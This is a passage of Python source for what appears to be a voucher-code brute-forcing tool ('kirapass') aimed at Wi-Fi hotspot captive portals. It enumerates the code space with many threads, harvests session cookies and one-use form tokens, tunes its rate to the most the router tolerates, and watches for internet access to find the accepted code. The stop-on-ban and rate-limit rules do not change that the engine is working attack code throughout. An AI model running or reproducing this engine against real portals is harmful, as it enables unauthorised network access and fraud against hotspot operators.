                "review_count": len(self.review),
                "stop_reason": self.stop_reason,
                "progress": progress,
                "speed": round(self.speed, 2),
                "elapsed": round(elapsed, 1),
                "latency": {"avg_ms": round(sum(lat) / len(lat)) if lat else 0,
                            "p95_ms": lat[int(len(lat) * 0.95)] if lat else 0},
                "throttle": {"delay_ms": self.throttle["delay_ms"],
                             "base_ms": self.throttle["base_ms"],
                             "reason": self.throttle["reason"]},
                "calibration": self.calibration,
                "internet_opened": self._internet_opened,
                "diagnostics": self.diagnostics,
                "verify_enabled": self.verify_enabled,
                "seq": self.seq,
            }

    def stop(self, reason: str = "user_stop") -> None:
        if not self.stop_reason:
            self.stop_reason = reason
        self.stop_event.set()

    def _wait(self, seconds: float) -> bool:
        """Sleep in small steps and wake up the moment the user stops the run.

        Returns False when the run was stopped while waiting.
        """
        end = time.time() + max(0.0, float(seconds or 0))
        while time.time() < end:
            if self.stop_event.wait(0.4):
                return False
        return True

    def start(self, profile: dict, attempts: int, threads: int, delay_ms: int = 0,
              keyword: str = "", known_card: str = "", verify_after: bool = True,
              auto_stop: bool = True, resume: bool = True) -> dict:
        if self.state == "running":
            return {"ok": False, "error": "already_running"}
        p = store.migrate(profile)
        if not resume:
            # start the space from the beginning again - with a fresh walk, so
            # it really is a new pass and not the same cards in the same order
            p.update({"space_pos": 0, "walk_a": 0, "walk_b": 0})
        problems = store.validate(p)
        hard = [x for x in problems if x != "space_is_astronomically_big"]
        if hard:
            return {"ok": False, "error": "profile_invalid", "problems": problems}

        self.profile = p
        self.plan = {"attempts": int(attempts), "threads": int(threads),
                     "delay_ms": int(delay_ms), "keyword": keyword,
                     "known_card": bool(known_card), "verify": bool(verify_after),
                     "resume": bool(resume)}
        self.verify_enabled = bool(verify_after)
        self.auto_stop = bool(auto_stop)
        self.counters = Counter()
        self.net_kinds = Counter()
        self.reason_counts = Counter()
        self.hits, self.review = [], []
        self.stop_reason, self.error = "", ""
        # a new run starts with a clean event stream, so the page never shows
        # results from the previous run
        with self.lock:
            self.events.clear()
            self.seq = 0
        self.latencies.clear()
        self.throttle.update({"delay_ms": int(delay_ms), "base_ms": int(delay_ms),
                              "reason": "", "events": []})
        self._ban_count = self._rate_count = self._unknown_saved = 0
        self._recent.clear()
        self._since_check = []
        self._internet_opened = None
        self._unevaluated = 0       # cards the router refused to judge
        self._retried = {}          # card -> how often we asked again
        self._pending = []          # cards waiting to be asked again
        self._retry_processed = 0   # extra attempts, not new cards covered
        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
        self._pool = None           # growable worker pool (see _add_workers)
        self._clean_streak = 0
        space = store.space_size(p)
        pos = max(0, int(p.get("space_pos", 0)))
        total = int(attempts)
        if space:
            remaining = space - (pos % space)
            total = min(total, remaining)
        self.progress = {"attempts": 0, "queued": 0, "dropped": 0,
                         "total": total, "covered": min(pos, space),
                         "space": space, "percent": 0.0}
        self.started_at, self.finished_at = time.time(), 0.0
        self.stop_event.clear()
        self.state = "calibrating"
        self.emit("state", {"state": "calibrating"})
        self.thread = threading.Thread(
            target=self._run, args=(p, int(attempts), int(threads), delay_ms,
                                    keyword, known_card),
            daemon=True, name="kirapass-engine")
        self.thread.start()
        return {"ok": True}

    # -- the run ---------------------------------------------------------
    def _run(self, p, attempts, threads, delay_ms, keyword, known_card) -> None:
        try:
            cal = calibrate(p, known_card=known_card, keyword=keyword,
                            checks=self.checks,
                            probes=config.CALIBRATION_PROBES)
            if not cal.ok and calibration_retryable(cal.error):
                # one hiccup must not cost the user the whole run
                self.emit("note", {"message": "retrying_learning",
                                   "after": cal.error})
                time.sleep(1.0)
                cal = calibrate(p, known_card=known_card, keyword=keyword,
                                checks=self.checks,
                                probes=config.CALIBRATION_PROBES)
            known_card_failure = False
            if known_card:
                shape_step = next((item for item in cal.steps
                                   if item.get("id") == "shape_tuned"), None)
                known_card_failure = bool(shape_step and not shape_step.get("ok"))
                if known_card_failure and not cal.error:
                    cal.error = shape_step.get("reason") or "known_card_not_proven"
            self.calibration = cal.as_dict()
            self.emit("calibration", self.calibration)
            if not cal.ok or known_card_failure:
                self.state, self.error = "done", cal.error or "calibration_failed"
                self.stop_reason = "calibration_failed"
                self.finished_at = time.time()
                self.emit("state", {"state": "done",
                                    "stop_reason": self.stop_reason})
                return
            self.profile = cal.profile
            self._internet_before = cal.internet or {}
            judge = cal.judge
            self.state = "running"
            self.emit("state", {"state": "running"})
            self._start_watchdog()

            space = store.space_size(self.profile)
            start_pos = int(self.profile.get("space_pos", 0))
            if self.profile.get("walk_a") in (0, None):
                self.profile["walk_a"] = _coprime(space)
                self.profile["walk_b"] = random.randrange(max(space, 1)) if space else 0
            if start_pos:
                # the user asked to continue: say it out loud instead of
                # silently starting somewhere in the middle of the space
                self.emit("resume", {"from": min(start_pos, space) if space
                                             else start_pos,
                                     "space": space,
                                     "pass": int(self.profile.get("space_pass", 0))})

            task_q = queue.Queue(maxsize=max(16, threads * 4))
            stop_holder = {"done": False}

            def worker():
                sess = new_session(for_attack=True,
                                   headers=browser_headers(self.profile,
                                                           self.profile["login_url"]))
                # a browser always asks for the page before it posts: take the
                # cookie and the hidden fields the portal is handing out, and
                # ask again every so often (tokens expire, sessions move)
                live = warm_up(sess, self.profile)
                since = 0
                try:
                    while not self.stop_event.is_set():
                        try:
                            item = task_q.get(timeout=0.2)
                        except queue.Empty:
                            if stop_holder["done"]:
                                return
                            continue
                        try:
                            if item is None:
                                return
                            if len(item) > 2 and item[2]:
                                with self.lock:
                                    self._retry_processed += 1
                            if live is None:
                                # we have no page and therefore no session:
                                # try once more before spending a card on a
                                # request the portal is going to refuse
                                live = warm_up(sess, self.profile) or live
                            if live is None:
                                with self.lock:
                                    self.net_kinds["no_session"] += 1
                                if not self._retry_later(item[0], item[1]):
                                    with self.lock:
                                        self._unevaluated += 1
                                self._emit_net_error("no_session", item[0],
                                                     None)
                                self._apply_delay_pressure("no_session")
                                self._check_stop_rules()
                                continue
                            if (config.WARMUP_EVERY > 0 and
                                    since >= config.WARMUP_EVERY):
                                # a refresh that fails keeps the page we have
                                live = warm_up(sess, live) or live
                                since = 0
                            since += 1
                            self._attempt(sess, judge, item[0], item[1], live)
                        except Exception as exc:      # noqa: BLE001
                            import traceback
                            with self.lock:
                                self.counters["INTERNAL_ERROR"] += 1
                            # the card was never judged (a hiccup in our own
                            # code or a socket the router dropped is not an
                            # answer): ask again, and only if we cannot do
                            # that leave it as "not tested" - a whole run must
                            # never end without really asking about the one
                            # card that works
                            if not self._retry_later(item[0], item[1]):
                                with self.lock:
                                    self._unevaluated += 1
                            self.emit("internal", {
                                "message": f"{type(exc).__name__}: {exc}",
                                "trace": traceback.format_exc()[-600:],
                                "card": item[0] if item else ""})
                        finally:
                            task_q.task_done()
                finally:
                    sess.close()

            workers = [threading.Thread(target=worker, daemon=True,
                                        name=f"kirapass-w{i}")
                       for i in range(threads)]
            for w in workers:
                w.start()
            # kept so the auto-pacer can add hands when this router is happy
            self._pool = {"q": task_q, "stop": stop_holder,
                          "worker": worker, "threads": list(workers),
                          "started": int(threads)}

            sent = 0
            pos = start_pos
            # `total` is the number of distinct cards remaining in this walk
            # pass, not the larger user request and never includes a wrap into
            # cards already covered earlier in the pass.
            planned = min(int(attempts), int(self.progress.get("total") or 0))
            try:
                while sent < planned and not self.stop_event.is_set():
                    card = store.card_at_walk_pos(self.profile, pos)
                    # bounded put: a stopped run must never hang here
                    while not self.stop_event.is_set():
                        try:
                            task_q.put((card, sent + 1, False), timeout=0.2)
                            break
                        except queue.Full:
                            continue
                    else:
                        break
                    pos += 1
                    sent += 1
                    with self.lock:
                        self.progress["queued"] = sent
                        self.progress["percent"] = round(min(
                            100.0, sent / max(self.progress["total"], 1) * 100), 1)
                    if space and pos - start_pos >= space:
                        break
            except KeyboardInterrupt:
                self.stop("user_stop")
            finally:
                # cards that never got an answer go back to the queue first:
                # they are the ones we know least about
                self._finish_retries(task_q)
                # let the workers finish what is already queued, so a card is
                # never counted as "tested" without being tested
                if not self.stop_event.is_set():
                    deadline = time.time() + 30
                    while time.time() < deadline:
                        if not getattr(task_q, "unfinished_tasks", 0):
                            break
                        time.sleep(0.02)
                dropped = 0
                while True:
                    try:
                        task_q.get_nowait()
                    except queue.Empty:
                        break
                    else:
                        dropped += 1
                        task_q.task_done()
                stop_holder["done"] = True
                self.stop_event.set()
                if dropped:
                    with self.lock:
                        self.progress["dropped"] = \
                            self.progress.get("dropped", 0) + dropped
                for w in list((self._pool or {"threads": workers})["threads"]):
                    w.join(timeout=5.0)

            # Remember how far we got, so the next run continues instead of
            # restarting.  Only cards that really got an answer are counted:
            # whatever was still in the queue when the run stopped is retried
            # next time (counting it as "done" would skip it forever).
            with self.lock:
                # Retry attempts are real requests and stay in the visible
                # counters, but they are not additional cards covered.
                processed = (sum(self.counters.values()) -
                             self._retry_processed)
                # A card the router met with a block page, a rate-limit page
                # or no answer at all was never judged, so it is not "done".
                refused = self._unevaluated + len(self._pending)
            resume_pos = max(start_pos,
                             start_pos + processed - refused)
            if space:
                passes, offset = divmod(resume_pos, space)
                self.profile["space_pos"] = offset
                if passes:
                    self.profile["space_pass"] = int(
                        self.profile.get("space_pass", 0)) + passes
                    # a new pass over the same space: walk it in a new order
                    self.profile["walk_a"] = _coprime(space)
                    self.profile["walk_b"] = random.randrange(space)
            else:
                self.profile["space_pos"] = resume_pos
            if self.persist:
                self.store.put(self.profile)

            with self.lock:
                self.progress["covered"] = min(resume_pos, space) if space \
                    else resume_pos
            if not self.stop_reason:
                self.stop_reason = "attempts_done"
            self.state = "done"
            self.finished_at = time.time()
            self._save_report()
            self.emit("state", {"state": "done",
                                "stop_reason": self.stop_reason})
        except Exception as exc:                          # noqa: BLE001
            import traceback
            self.error = f"{type(exc).__name__}: {exc}"
            self.state = "done"
            self.finished_at = time.time()
            self.stop_reason = "engine_error"
            self.emit("error", {"message": self.error,
                                "trace": traceback.format_exc()[-800:]})
            self.emit("state", {"state": "done", "stop_reason": self.stop_reason})

    # -- one attempt -----------------------------------------------------
    def _attempt(self, sess, judge, card: str, sent_index: int,
                 profile: dict = None) -> None:
        if self.stop_event.is_set():
            return
        p = profile or self.profile
        sess.read_timeout = config.ATTACK_READ_TIMEOUT
        delay = self.throttle["delay_ms"] / 1000.0
        if delay > 0:
            time.sleep(delay)
        started = time.time()
        resp = None
        last_err = None
        for attempt in range(3):        # retry only real transport hiccups
            try:
                resp = send_login(sess, p, card)
                break
            except Exception as exc:                      # noqa: BLE001
                err = classify(exc, p.get("login_url", ""))
                last_err = err
                if err.retryable and attempt < 2:
                    time.sleep(0.06 * (attempt + 1))
                    continue
                break

        if resp is None:
            kind = last_err.kind if last_err else "unknown"
            with self.lock:
                self.net_kinds[kind] += 1
            # no answer at all: ask again before calling this card tested
            if not self._retry_later(card, sent_index):
                with self.lock:
                    self._unevaluated += 1
            self._emit_net_error(kind, card, last_err)
            self._apply_delay_pressure(kind)
            self._check_stop_rules()
            return

        elapsed_ms = (time.time() - started) * 1000
        verdict = judge.classify(resp, submitted_values(p, card))
        if profile is not None and (resp.text or "").strip():
            # The returned login form is what a browser would render next. It
            # may carry a new one-use token, action or CHAP challenge. Update
            # this worker's private request shape in place for its next card.
            fresh = absorb_form(p, resp.text, resp.url or p["login_url"])
            if fresh is not p:
                profile.clear()
                profile.update(fresh)
                p = profile
        if verdict.is_hit and self.verify_enabled:
            verdict = self._verify_hit(sess, verdict, card)

        with self.lock:
            self.latencies.append(round(elapsed_ms))
            self.counters[verdict.code] += 1
            self.reason_counts[verdict.reason] += 1
            if verdict.is_hit:
                self._clean_streak = 0
            else:
                self._clean_streak += 1

        if verdict.is_hit:
            self._register_hit(card, verdict)
        elif verdict.code == "UNKNOWN":
            self._save_unknown(card, verdict, resp)
        elif verdict.code == "BANNED":
            # every worker thread touches these counters, so they are only
            # ever changed while holding the lock (a lost update here would
            # mean a ban page that never stops the run)
            with self.lock:
                self._ban_count += 1
            self._apply_delay_pressure("banned")
        elif verdict.code == "RATE_LIMITED":
            with self.lock:
                self._rate_count += 1
            self._apply_delay_pressure("rate_limited", resp)
        elif verdict.code == "CHALLENGE":
            self.stop("captcha_challenge")

        with self.lock:
            row = {"card": card, "code": verdict.code, "reason": verdict.reason,
                   "time": time.strftime("%H:%M:%S")}
            self._recent.append(row)
            # every card sent since the last "still behind the wall?" check is
            # a suspect; at 200 cards a second a fixed-size buffer would throw
            # the working card away before we ever look at it
            self._since_check.append(row)
            if verdict.code in ("BANNED", "RATE_LIMITED"):
                # the router refused to judge this card: it is not tested yet,
                # so it must not be marked as covered
                self._unevaluated += 1
        self._emit_attempt(card, resp, verdict, sent_index)
        self._maybe_decay_delay()
        self._auto_pace(verdict.code)
        self._check_stop_rules()

    def _retry_later(self, card: str, sent_index: int) -> bool:
        """Remember a card we never got an answer for, and ask again later.

        A request can die on the way (a socket the router closed, a reply that
        came after our timeout).  The router may well have taken it, so the
        card is not "tested" yet - a run must not move on and leave the one
        card that works unasked.  Bounded: `config.MAX_CARD_RETRIES` extra
        tries per card, handed back to the queue by `_finish_retries`.
        """
        with self.lock:
            if self.stop_event.is_set():
                return False
            tries = self._retried.get(card, 0)
            if tries >= config.MAX_CARD_RETRIES:
                return False
            self._retried[card] = tries + 1
            self._pending.append((card, sent_index, True))
        return True

    def _finish_retries(self, task_q) -> None:
        """Hand the cards that got no answer back to the workers.

        This runs after every card of the plan was queued: the workers are
        still running, so the queue cannot stay full - a blocking put is safe
        here, while a `put_nowait` inside a worker would silently lose the
        card whenever the queue happens to be full.
        """
        for _ in range(config.MAX_CARD_RETRIES + 1):
            # First wait for everything currently queued. A failed card can
            # add itself to `_pending` at any point while the original plan is
            # draining; looking at `_pending` first is a race and used to lose
            # precisely the late failures near the end of a run.
            deadline = time.time() + 30
            while time.time() < deadline and not self.stop_event.is_set():
                if not getattr(task_q, "unfinished_tasks", 0):
                    break
                time.sleep(0.02)
            with self.lock:
                pending, self._pending = list(self._pending), []
            if not pending:
                return
            for item in pending:
                while not self.stop_event.is_set():
                    try:
                        task_q.put(item, timeout=0.2)
                        break
                    except queue.Full:
                        continue
                else:
                    # the run was stopped: these cards stay untested
                    with self.lock:
                        self._unevaluated += 1
        # A final no-answer may have queued itself on the final allowed retry.
        # Keep it explicitly untested for the next run.
        with self.lock:
            self._unevaluated += len(self._pending)
            self._pending = []

    def _verify_hit(self, sess, verdict: Verdict, card: str) -> Verdict:
        """A hit is only final when the card really opened the internet.

        If the machine was already online before we sent any card, an internet
        check cannot prove anything - then the verdict stays ACCEPTED and the
        reason says exactly that, instead of faking certainty.
        """
        already_online = (self._internet_before or {}).get("state") == "ONLINE"
        if already_online:
            status = verify.portal_status_page(sess, self.profile["login_url"])
            return Verdict("ACCEPTED", "accepted_internet_already_open",
                           min(verdict.confidence, 0.85),
                           data={**verdict.data,
                                 "internet": "SKIPPED_ALREADY_ONLINE",
                                 "status_page": status.get("looks_logged_in", False)},
                           evidence={**verdict.evidence, "status_page": status})
        # The confirmation is a network request too.  If it dies (a socket the
        # router dropped while it was handing us over) the card itself was
        # still accepted: say "accepted, not confirmed" instead of throwing
        # the hit away - a lost hit is the one thing this tool must never do.
        try:
            ok, info = verify.verify_online(sess, checks=self.checks)
        except Exception as exc:                       # noqa: BLE001
            ok, info = False, {"state": "", "detail": f"{type(exc).__name__}",
                               "status": 0, "location": "", "url": ""}
        try:
            status = verify.portal_status_page(sess, self.profile["login_url"])
        except Exception as exc:                       # noqa: BLE001
            status = {"checked": False, "reason": type(exc).__name__,
                      "looks_logged_in": False}
        v = Verdict("ACCEPTED_VERIFIED" if ok else verdict.code,
                    "redirect_out_of_portal_and_online" if ok else verdict.reason,
                    1.0 if ok else verdict.confidence,
                    data={**verdict.data, "internet": info.get("state", ""),
                          "internet_detail": info.get("detail", ""),
                          "status_page": status.get("looks_logged_in", False)},
                    evidence={**verdict.evidence, "internet": info,
                              "status_page": status})
        if not ok and verdict.code == "ACCEPTED":
            v.code = "ACCEPTED_UNVERIFIED"
        return v

    def _register_hit(self, card: str, verdict: Verdict) -> None:
        hit = {"card": card, "code": verdict.code, "reason": verdict.reason,
               "confidence": verdict.confidence, "time": time.strftime("%H:%M:%S"),
               "data": verdict.data}
        with self.lock:
            self.hits.append(hit)
        self.store.append_hit(f"{time.strftime('%Y-%m-%d %H:%M:%S')} card={card} "
                              f"code={verdict.code} reason={verdict.reason} "
                              f"{json.dumps(verdict.data, ensure_ascii=False)[:200]}")
        self.emit("hit", hit)
        strong = (verdict.code == "ACCEPTED_VERIFIED"
                  or verdict.confidence >= 0.85)
        if self.auto_stop and strong:
            self.stop("found_verified" if verdict.code == "ACCEPTED_VERIFIED"
                      else "found_strong_evidence")

    def _save_unknown(self, card: str, verdict: Verdict, resp) -> None:
        with self.lock:
            if self._unknown_saved >= 50:
                return
            self._unknown_saved += 1
        saved = self.store.save_review(self.seq, card, verdict.as_dict(),
                                       resp.text or "")
        if saved:
            with self.lock:
                self.review.append(saved)
            self.emit("review", saved)

    def _emit_attempt(self, card, resp, verdict: Verdict, idx: int) -> None:
        interesting = verdict.code != "REJECTED"
        with self.lock:
            self._rejected_since_emit += 1
            quiet = self._rejected_since_emit
        if not interesting and quiet < 25:
            self._emit_stats()
            return
        with self.lock:
            self._rejected_since_emit = 0
        self.emit("attempt", {
            "card": card, "code": verdict.code, "reason": verdict.reason,
            "data": verdict.data, "status": resp.status,
            "ms": round(resp.elapsed_ms), "length": resp.length,
            "location": resp.location[:120], "index": idx,
        })
        self._emit_stats()

    def _emit_net_error(self, kind: str, card: str, err) -> None:
        with self.lock:
            self.counters["NET_ERROR"] += 1
            self.reason_counts[kind] += 1
        self.emit("attempt", {"card": card, "code": "NET_ERROR", "reason": kind,
                              "data": {"text": (err.text if err else "")[:160]},
                              "status": 0, "ms": 0, "length": 0})
        self._emit_stats()

    def _emit_stats(self) -> None:
        now = time.time()
        if now - self._last_event_at < 0.4:
            return
        self._last_event_at = now
        self.emit("stats", self.status_snapshot())

    def status_snapshot(self) -> dict:
        with self.lock:
            return {"counters": dict(self.counters),
                    "reason_counts": dict(self.reason_counts),
                    "net_kinds": dict(self.net_kinds),
                    "progress": dict(self.progress),
                    "speed": round(self.speed, 1),
                    "delay_ms": self.throttle["delay_ms"],
                    "throttle_reason": self.throttle["reason"]}

    # -- flow control ----------------------------------------------------
    def _apply_delay_pressure(self, reason: str, resp=None) -> None:
        """Slow down on purpose and say why. Never slow down silently."""
        with self.lock:
            base = self.throttle["base_ms"]
            current = self.throttle["delay_ms"]
            cap = 2000
            if reason == "rate_limited":
                wait = _retry_after(resp) if resp is not None else 0
                new = max(current + 250, min(cap, base + 400), min(wait * 1000, cap))
                note = "rate_limited_slowing_down"
            elif reason == "banned":
                new = min(cap, max(current + 400, 800))
                note = "ban_page_slowing_down"
            elif reason in ("refused", "reset"):
                new = min(cap, current + 75)
                note = "connections_refused_slowing_down"
            elif current < 1000:      # transient hiccups: nudge, never flood
                new = current + 25
                note = "network_errors_slowing_down"
            else:
                new = current
                note = "network_errors_slowing_down"
            self.throttle["delay_ms"] = int(new)
            self.throttle["reason"] = note
            self.throttle["events"].append({"t": round(time.time(), 1),
                                            "reason": note,
                                            "delay_ms": int(new)})
        self.emit("throttle", {"reason": note, "delay_ms": int(new)})

    def _maybe_decay_delay(self) -> None:
        """Back to the pace the user asked for once the router calmed down."""
        base = self.throttle["base_ms"]
        with self.lock:
            current = self.throttle["delay_ms"]
            if current <= base or self._clean_streak < 150:
                return
            new = max(base, int(current * 0.6))
            self._clean_streak = 0
            self.throttle["delay_ms"] = new
            self.throttle["reason"] = "recovering_speed" if new > base else ""
        self.emit("throttle", {"reason": "recovering_speed", "delay_ms": new})

    # -- finding the fastest pace this router actually allows -------------
    def _auto_pace(self, code: str) -> None:
        """Additive increase / multiplicative decrease, the way TCP does it.

        Every few seconds we look at what came back: if the router answered
        cleanly we ask a little more of it (shorter delay, then extra hands);
        the moment it answers with errors, rate-limit pages or block pages we
        halve the rate.  The result is the best pace *this* router allows,
        found while the run is going - and the page says what it is doing.
        """
        if not config.AUTO_PACE:
            return
        now = time.time()
        with self.lock:
            w = self._pace
            w["n"] += 1
            if code in ("REJECTED", "ACCEPTED", "ACCEPTED_VERIFIED",
                        "ACCEPTED_UNVERIFIED"):
                w["ok"] += 1
            else:
                w["bad"] += 1
            if now - w["t"] < config.PACE_WINDOW_SECONDS or w["n"] < 8:
                return
            total, bad = w["n"], w["bad"]
            delay, base = self.throttle["delay_ms"], self.throttle["base_ms"]
            self._pace = {"t": now, "n": 0, "ok": 0, "bad": 0}
        ratio = bad / max(total, 1)
        if ratio > config.PACE_BAD_RATIO:
            new = min(config.PACE_MAX_DELAY_MS, max(delay * 2, 120))
            note = "auto_slowed_router_complaining"
        elif ratio == 0 and delay <= base:
            added = self._add_workers(2)
            if not added:
                return
            note = "auto_sped_up_more_threads"
            new = delay
        elif ratio <= 0.01 and delay > base:
            new = max(base, int(delay * 0.7))
            note = "auto_sped_up"
        else:
            return
        with self.lock:
            self.throttle["delay_ms"] = int(new)
            self.throttle["reason"] = note
            self.throttle["events"].append({"t": round(now, 1), "reason": note,
                                            "delay_ms": int(new)})
            threads = len((self._pool or {}).get("threads", []))
        self.emit("throttle", {"reason": note, "delay_ms": int(new),
                               "threads": threads})

    def _add_workers(self, count: int) -> int:
        """Give the run more hands - only when the router is answering cleanly."""
        pool = getattr(self, "_pool", None)
        if not pool:
            return 0
        cap = min(config.PACE_MAX_THREADS, max(4, pool["started"] * 2))
        added = 0
        for _ in range(count):
            with self.lock:
                if len(pool["threads"]) >= cap:
                    break
                t = threading.Thread(target=pool["worker"], daemon=True,
                                     name=f"kirapass-wx{len(pool['threads'])}")
                pool["threads"].append(t)
            t.start()
            added += 1
        return added

    # -- "did the wall come down?" -----------------------------------------
    def _start_watchdog(self) -> None:
        """Watch the internet while the run is going.

        Some routers log the guest in and still answer with the rejection
        page, so a hit can slip past the judge entirely.  The internet itself
        cannot lie: when it opens mid-run, one of the cards we just sent did
        it, and those cards are handed to the user as suspects.
        """
        if not (config.WATCH_INTERNET and self.verify_enabled):
            return
        if (self._internet_before or {}).get("state") != "WALLED":
            return          # already online (or offline): proves nothing
        checks = self.checks

        def watch():
            sess = new_session()
            try:
                while not self.stop_event.wait(config.WATCH_EVERY_SECONDS):
                    try:
                        state = verify.probe_internet(sess, checks=checks)["state"]
                    except Exception:                       # noqa: BLE001
                        continue
                    with self.lock:
                        if state == "ONLINE":
                            suspects = list(self._since_check)
                        else:
                            suspects = None
                            self._since_check = []   # none of these did it
                    if suspects is not None and not self._internet_opened:
                        with self.lock:
                            self._internet_opened = {
                                "at": time.strftime("%H:%M:%S"),
                                "suspects": suspects,
                            }
                        self.emit("internet_opened",
                                  {"at": self._internet_opened["at"],
                                   "suspects": suspects,
                                   "count": len(suspects)})
                        self.stop("internet_opened")
                        return
            finally:
                sess.close()

        self._watch_thread = threading.Thread(
            target=watch, daemon=True, name="kirapass-watchdog")
        self._watch_thread.start()

    def _check_stop_rules(self) -> None:
        """Stop only for reasons we can explain."""
        counters = self.counters
        errors = counters.get("NET_ERROR", 0)
        attempts = sum(counters.values())
        if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:
            self.stop("target_unreachable")
        # Treat the router's first explicit lockout/rate-limit response as a
        # hard stop. Never wait it out and resume probing automatically.
        if self._ban_count >= 1:
            self.stop("banned_by_router")
            return
        if self._rate_count >= 1:
            self.stop("rate_limited_by_router")
            return
        if counters.get("CHALLENGE", 0) >= 1:
            self.stop("captcha_challenge")

    # -- report ----------------------------------------------------------
    def _save_report(self) -> None:
        status = self.status()
        report = {
            "tool": config.APP_NAME, "version": config.VERSION,
            "finished": time.strftime("%Y-%m-%d %H:%M:%S"),
            "profile": self.profile.get("name", ""),
            "login_url": self.profile.get("login_url", ""),
            "plan": self.plan,
            "result": {"stop_reason": self.stop_reason, "hits": self.hits,
                       "state": self.state, "error": self.error},
            "counters": status["counters"],
            "reason_counts": status.get("reason_counts", {}),
            "net_kinds": status["net_kinds"],
            "progress": status["progress"],
            "speed": status["speed"], "elapsed": status["elapsed"],
            "latency": status["latency"],
            "throttle_events": self.throttle["events"],
            "calibration": self.calibration,
            "internet_opened": self._internet_opened,
            "review_files": [r.get("file") for r in self.review],
            "profile_snapshot": safe_profile_snapshot(self.profile),
        }
        try:
            path = self.store.save_run(report)
            self.emit("report", {"file": os.path.basename(path)})
        except Exception:                                 # noqa: BLE001
            pass


def _coprime(space: int) -> int:
    """A step that visits every index exactly once before repeating."""
    import math
    if space <= 2:
        return 1
    while True:
        a = random.randrange(1, space)
        if math.gcd(a, space) == 1:
            return a


def _retry_after(resp) -> int:
    try:
        value = int((resp.header("retry-after") or "0").strip())
        return max(0, min(value, 30))
    except Exception:
        return 0


# ---------------------------------------------------------------------------
# how much does this router forgive?  (measure the protection, do not fight it)
# ---------------------------------------------------------------------------
def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                  wait_limit: float = 240.0, step: float = 10.0,
                  pace: float = 0.4, log=None) -> dict:
    """Run a capped, explicit diagnostic and stop at the first protective reply.

    The legacy wait_limit and step parameters are accepted for API compatibility
    but intentionally ignored: this diagnostic never waits for expiry or tests
    another card after a block, rate limit, or CAPTCHA.
    """
    p = store.migrate(profile)
    say = log or (lambda *a, **k: None)
    out = {"ok": False, "error": "", "tried": 0, "ban_after": None,
           "clears_after": None, "safe_delay_ms": None, "steps": [],
           "max_failures": int(max_failures), "waited": 0.0}

    def step_row(step_id, ok, reason, detail=None):
        out["steps"].append({"id": step_id, "ok": ok, "reason": reason,
                             "detail": detail or {}})

    if store.space_size(p) <= 0:
        out["error"] = "card_space_empty"
        step_row("profile_valid", False, "card_space_empty", {})
        return out

    session = new_session(headers=browser_headers(p, p["login_url"]))
    try:
        try:
            resp = session.get(p["login_url"], allow_redirects=True)
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            out["error"] = err.kind
            step_row("reach_login_page", False, f"net_{err.kind}",
                     {"text": err.text[:200]})
            return out
        p["login_url"] = resp.url or p["login_url"]
        p = absorb_form(p, resp.text or "", p["login_url"])

        def blocked(r) -> tuple:
            """Protective block/rate-limit/CAPTCHA page, with evidence."""
            return _is_protective_reply(r, p["login_url"])

        is_block, word = blocked(resp)
        if is_block:
            out["error"] = ("captcha_challenge" if word == "captcha_challenge"
                            else "blocked_from_the_start")
            step_row("reach_login_page", False, out["error"],
                     {"status": resp.status, "word": word})
            return out
        step_row("reach_login_page", True, "http_ok", {"status": resp.status})

        # --- 1. bounded, opt-in check; stop at the first block reply ------
        space = store.space_size(p)
        limit = max(0, min(int(max_failures), config.LOCKOUT_PROBE_MAX_FAILURES))
        out["max_failures"] = limit
        failures = 0
        for i in range(limit):
            card = store.decode_card(p, i % space)
            try:
                r = send_login(session, p, card)
            except Exception as exc:                    # noqa: BLE001
                err = classify(exc, p["login_url"])
                out["error"] = err.kind
                step_row("failures", False, f"net_{err.kind}",
                         {"text": err.text[:160], "failures": failures})
                return out
            failures += 1
            is_block, word = blocked(r)
            if is_block:
                # The request returning the protective page was not judged.
                # Record it and stop; never poll for expiry or test another card.
                out["tried"] = failures
                if word == "captcha_challenge":
                    out["error"] = "captcha_challenge"
                    step_row("failures", False, "captcha_challenge",
                             {"failures": failures, "status": r.status})
                    return out
                out["ban_after"] = max(0, failures - 1)
                out["ok"] = True
                step_row("failures", True, "blocked_after",
                         {"failures": failures, "forgiven": out["ban_after"],
                          "status": r.status, "word": word})
                step_row("recovery", False, "not_probed_after_lockout",
                         {"advice": "stop_and_contact_network_admin"})
                return out
            p = absorb_form(p, r.text or "", r.url or p["login_url"])
            time.sleep(max(0.0, min(float(pace), 1.0)))
        out["tried"] = failures
        out["ok"] = True
        step_row("failures", True, "no_block_within_safe_limit",
                 {"failures": failures, "limit": limit})
        return out
    finally:
        session.close()


def known_card_problem(p: dict, card: str) -> dict:
    """Does this card even fit the format we were asked to guess?

    A known card that does not match the prefix/length/charset can never be
    sent by the walk, so the tuning step is doomed from the start - better to
    say exactly what is wrong.
    """
    card = (card or "").strip()
    if not card:
        return {}
    prefix = p.get("prefix", "") or ""
    suffix = p.get("suffix", "") or ""
    length = int(p.get("length") or 0)
    charset = set(p.get("charset") or "")
    if length and len(card) != length:
        return {"reason": "length_mismatch", "card_length": len(card),
                "profile_length": length}
    if prefix and not card.startswith(prefix):
        return {"reason": "prefix_mismatch", "prefix": prefix}
    if suffix and not card.endswith(suffix):
        return {"reason": "suffix_mismatch", "suffix": suffix}
    if charset:
        middle = card[len(prefix):len(card) - len(suffix) if suffix else len(card)]
        alien = sorted(set(middle) - charset)
        if alien:
            return {"reason": "charset_mismatch", "chars": "".join(alien)[:20],
                    "charset": "".join(sorted(charset))[:40]}
    return {}


def _summarise_trials(trials: list, limit: int = 6) -> list:
    """Keep what explains the failure: what we sent and what came back."""
    out = []
    for t in trials:
        out.append({"mode": t.get("mode", ""), "method": t.get("method", ""),
                    "dst": (t.get("dst") or "")[:48],
                    "status": t.get("status", 0), "code": t.get("code", ""),
                    "reason": t.get("reason", ""), "word": t.get("word", ""),
                    "location": (t.get("location") or "")[:60]})
    # newest is not interesting - the most "alive" answers are
    out.sort(key=lambda r: (r["code"] == "REJECTED", r["reason"]))
    return out[:limit]
